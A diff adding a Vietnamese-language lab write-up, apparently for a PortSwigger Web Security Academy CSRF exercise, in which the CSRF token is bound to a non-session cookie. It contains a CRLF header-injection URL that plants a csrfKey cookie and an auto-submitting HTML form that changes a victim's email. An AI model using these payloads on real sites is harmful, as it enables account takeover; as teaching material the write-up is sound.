@@ -137,6 +137,71 @@ Nyên lý hoạt động:
 - Một số ứng dụng tạo và xác thực `CSRF token` mà không ràng buộc token đó với phiên đăng nhập (**session**) cụ thể của người dùng. Thay vào đó, hệ thống chỉ kiểm tra xem token đó có nằm trong danh sách token đã phát hành hay không.
 - Do đó có thể sử dụng `CSRF token` để khai thác
 
+### CSRF token is tied to a non-session cookie
+Một số ứng dụng cố gắng bảo vệ chống lại **CSRF** bằng cách gắn token với cookie, nhưng lại không gắn với cookie dùng để quản lý phiên đăng nhập (**session cookie**). Thay vào đó, token được gắn với một cookie phụ khác, ví dụ **csrfKey**.
+
+#### Determine the behavior of CSRF tokens
+- Đăng nhập vào tài khoản A bằng trình duyệt của **Burp Suite**.
+- Gửi form "Update email", kiểm tra request trong tab **Proxy History**.
+
+#### Test the relationship between **session** and **csrfKey**
+Gửi request này sang tab Repeater trong Burp để test:
+- Thay đổi giá trị **cookie session** → bị đăng xuất → phiên thực sự phụ thuộc vào cookie này.
+- Thay đổi giá trị **cookie csrfKey** → request bị từ chối do sai token → csrfKey không gắn chặt với session.
+**Kết luận:** CSRF token trong cookie csrfKey không ràng buộc với session.
+
+#### Test token from account A to account B
+- Mở cửa sổ ẩn danh, đăng nhập bằng tài khoản B.
+- Gửi yêu cầu đổi email từ tài khoản B trong Burp.
+- Trong Burp Repeater:
+    - Dán csrfKey cookie và giá trị csrf từ tài khoản A vào request của tài khoản B.
+    - Request vẫn thành công → tức là token CSRF từ tài khoản A dùng được cho tài khoản B, vì không bị ràng buộc bởi session.
+
+#### Find cookie insertion point from client
+- Quay lại tab trình duyệt ban đầu (đã đăng nhập tài khoản A).
+- Gửi một truy vấn tìm kiếm (search).
+- Quan sát thấy nội dung tìm kiếm bị phản hồi lại trong header:
+```http
+HTTP/2 200 OK
+Set-Cookie: LastSearchTerm=abc; Secure; HttpOnly
+Content-Type: text/html; charset=utf-8
+X-Frame-Options: SAMEORIGIN
+Content-Length: 3419
+```
+
+**Ý tưởng:** định dạng chuỗi tìm kiếm một cách khéo léo, có thể ép server gửi **Set-Cookie** độc hại về trình duyệt nạn nhân.
+
+#### Create URL to inject cookie into victim browser
+```
+"/?search=abc%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b..."
+```
+
+- `%0d%0a (\r\n)` là kí tự xuống dòng trong HTTP header.
+- Chuỗi `/search?...` sẽ ép server phản hồi:
+```http
+HTTP/2 200 OK
+Set-Cookie: LastSearchTerm=abc
+Set-Cookie: csrfKey=sL7zNuuRkOfaT3LTlOCT2GkNLa8QKzYK;SameSite=None; Secure; HttpOnly
+```
+
+Khi người dùng truy cập vào URL này, trình duyệt sẽ lưu lại cookie csrfKey do kẻ tấn công chỉ định.
+
+#### Create and host an exploit to automatically send CSRF requests
+- Đến request `change email` tạo mã khai thác CSRF
+- Lấy **token** tại **response** của `/my-account`
+```html
+    <form action="https://0a9300f203c2f67c809c037400ce0063.web-security-academy.net/my-account/change-email" method="POST">
+        <input type="hidden" name="csrf" value="ubbY8fvXWI9r55sxmIbPGZXN1fXcOMW1">
+        <input type="hidden" name="email" value="evil@gmail.com">
+        <img src="https://0a9300f203c2f67c809c037400ce0063.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=WKT3HORZFW74kJQyzwoD3zk0w3d0g0eK%3b%20SameSite=None" onerror="document.forms[0].submit()">    
+    </form>
+```
+- Thay vì gửi ngay `(<script>form.submit()</script>)`, chèn một thẻ ảnh để tiêm cookie trước:
+- Đến **Exploit Server**
+- Dán mã khai thác vào body 
+- Deliver to victim
+
+
 ## Prevent
 ---
 Hiện nay, để khai thác thành công một lỗ hổng **CSRF**, kẻ tấn công thường phải vượt qua các biện pháp phòng vệ được triển khai bởi website mục tiêu, trình duyệt của nạn nhân, hoặc cả hai.
